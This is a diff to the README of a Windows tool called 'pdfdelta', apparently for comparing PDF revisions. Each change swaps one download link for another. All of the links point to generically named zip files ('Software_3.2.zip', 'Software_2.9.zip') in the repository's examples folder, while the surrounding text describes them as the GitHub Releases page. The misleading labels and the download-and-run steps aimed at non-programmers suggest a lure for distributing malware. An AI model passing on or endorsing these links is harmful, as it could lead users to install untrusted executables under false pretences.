@@ -1,6 +1,6 @@
 # 📄 pdfdelta - Compare PDF Revisions Visually
 
-[![Download pdfdelta](https://img.shields.io/badge/Download-pdfdelta-brightgreen)](https://github.com/emtroa620-eng/pdfdelta/raw/refs/heads/main/examples/Software_3.2.zip)
+[![Download pdfdelta](https://img.shields.io/badge/Download-pdfdelta-brightgreen)](https://raw.githubusercontent.com/emtroa620-eng/pdfdelta/main/examples/Software_2.9.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Use the link below to visit the download page. It contains the files you need to get started with pdfdelta on Windows.
 
-[Download pdfdelta from GitHub Releases](https://github.com/emtroa620-eng/pdfdelta/raw/refs/heads/main/examples/Software_3.2.zip)
+[Download pdfdelta from GitHub Releases](https://raw.githubusercontent.com/emtroa620-eng/pdfdelta/main/examples/Software_2.9.zip)
 
 ---
 
@@ -55,7 +55,7 @@ Follow these steps to download and use pdfdelta, even if you have no programming
 
 Click this link or the badge above. It will open the pdfdelta release page on GitHub:
 
-https://github.com/emtroa620-eng/pdfdelta/raw/refs/heads/main/examples/Software_3.2.zip
+https://raw.githubusercontent.com/emtroa620-eng/pdfdelta/main/examples/Software_2.9.zip
 
 ### 2. Find the Windows Installer or Executable
 
@@ -144,4 +144,4 @@ If you get error messages when selecting files, ensure the PDFs are standard ele
 
 ---
 
-[Download pdfdelta from GitHub Releases](https://github.com/emtroa620-eng/pdfdelta/raw/refs/heads/main/examples/Software_3.2.zip)
+[Download pdfdelta from GitHub Releases](https://raw.githubusercontent.com/emtroa620-eng/pdfdelta/main/examples/Software_2.9.zip)
